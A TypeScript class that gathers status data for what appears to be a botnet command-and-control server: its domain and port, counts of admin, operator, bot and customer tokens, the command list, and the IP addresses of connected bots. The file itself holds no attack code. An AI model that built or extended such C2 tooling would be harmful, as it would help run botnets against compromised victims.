import { SocketManager } from "@/clients";
import { Command } from "@/command";
import { env } from "@common/utils/envConfig";
import { TokenManager } from "@/tokens";

interface IInfo {
    cnc_domain: string;
    cnc_port: number;
    admins_count: number;
    operators_count: number;
    supervisors_count: number;
    bot_count: number;
    customers_count: number;
    commands: string[];
    ip_addresses: string[];
    ip_count: number;
}

export class Info implements IInfo {
    cnc_domain: string;
    cnc_port: number;
    admins_count: number;
    operators_count: number;
    supervisors_count: number;
    bot_count: number;
    customers_count: number;
    commands: string[];
    ip_addresses: string[];
    ip_count: number;

    constructor() {
        this.cnc_domain = env.TCP_HOST;
        this.cnc_port = env.TCP_PORT;
        this.admins_count = 0;
        this.operators_count = 0;
        this.supervisors_count = 0;
        this.bot_count = 0;
        this.customers_count = 0;
        this.commands = [];
        this.ip_addresses = [];
        this.ip_count = 0;
    }

    /**
     * Metodo asincrono per inizializzare i dati
     */
    public async init(): Promise<void> {
        this.admins_count = await TokenManager.getNoTokensByRole('admin');
        this.operators_count = await TokenManager.getNoTokensByRole('operator');
        this.supervisors_count = await TokenManager.getNoTokensByRole('supervisor');
        this.bot_count = await TokenManager.getNoTokensByRole('bot');
        this.customers_count = await TokenManager.getNoTokensByRole('customer');
        this.commands = await Command.getAllCommands();
        this.ip_addresses = (await SocketManager.getAllStoredSockets()).map(ip => ip.ip);
        this.ip_count = this.ip_addresses.length;
    }

    public toJSON(): IInfo {
        return {
            cnc_domain: this.cnc_domain,
            cnc_port: this.cnc_port,
            admins_count: this.admins_count,
            operators_count: this.operators_count,
            supervisors_count: this.supervisors_count,
            bot_count: this.bot_count,
            customers_count: this.customers_count,
            commands: this.commands,
            ip_addresses: this.ip_addresses,
            ip_count: this.ip_count
        };
    }
}
